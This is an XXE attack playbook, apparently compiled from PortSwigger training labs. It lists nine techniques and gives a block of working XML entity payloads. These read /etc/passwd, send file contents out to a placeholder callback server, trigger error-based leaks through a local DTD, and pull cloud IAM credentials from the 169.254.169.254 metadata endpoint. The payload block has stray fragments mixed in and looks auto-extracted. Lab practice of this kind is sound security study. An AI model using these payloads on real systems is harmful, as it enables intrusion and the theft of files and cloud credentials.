## XXE Playbook
*Synthesized from 9 PortSwigger labs*

### Overview
This playbook covers 9 known attack techniques for xxe.

### Attack Techniques

**Blind Techniques:**
- Exploiting blind XXE to retrieve data via error messages
- Exploiting blind XXE to exfiltrate data using a malicious external DTD
- Blind XXE with out-of-band interaction
- Blind XXE with out-of-band interaction via XML parameter entities

**General:**
- Exploiting XXE to retrieve data by repurposing a local DTD
- Exploiting XXE to perform SSRF attacks
- Exploiting XXE using external entities to retrieve files
- Exploiting XInclude to retrieve files
- Exploiting XXE via image file upload

### Key Payloads
```
ISOamso.
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://[CALLBACK_SERVER]/?x=%file;'>">
%eval;
%exfil;
productId
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://[CALLBACK_SERVER]"> ]>
http://169.254.169.254/
XInclude
&xxe;
stockCheck
/etc/hostname
SecretAccessKey
ISOamso
/latest/meta-data/iam/security-credentials/admin
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
file
/etc/passwd
/usr/share/yelp/dtd/docbookx.dtd
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://[CALLBACK_SERVER]"> %xxe; ]>
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

